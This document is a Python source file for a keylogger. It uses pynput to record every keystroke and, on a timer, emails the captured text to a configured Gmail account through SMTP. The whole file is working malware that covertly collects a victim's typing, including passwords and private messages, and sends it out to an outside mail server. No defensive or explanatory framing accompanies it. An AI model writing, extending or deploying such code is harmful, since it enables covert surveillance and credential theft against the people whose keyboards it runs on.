#!/usr/bin/env python
from pynput import keyboard
import threading, smtplib, ssl


class Keylog:

    def __init__(self, time_interval, email, password):
        self.keyloged = ""
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def log_appender(self, string_to_append):
        self.keyloged = self.keyloged + string_to_append

    # callback for every key stroke
    def _proc_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.log_appender(current_key)

    # Send the report via email every time_interval
    def report_logging(self):
        print(self.keyloged)
        message_to_send = ''' Subject: ON GOING CAPTURE \n\n Content: {0}'''
        message_to_send.format(self.keyloged)
        self.send_mail(self.email, self.password, message_to_send.format(self.keyloged))
        self.keyloged = ""
        #Creating thread to trigger the report
        timer = threading.Timer(self.time_interval, self.report_logging)
        timer.start()

    # Send an email with the stroked keys
    def send_mail(self, email, password, message):
        # Creating an SSl context and a encrypted SMTP server instance with gmail server
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", "465", context=context) as smtp_server:
            smtp_server.login(email, password)
            smtp_server.sendmail(email, email, message)
            print("MAIL SENT!!")

    #Start the key logger
    def start(self):
        with keyboard.Listener(on_press=self._proc_key) as k_listener:
            self.report_logging()
            k_listener.join()
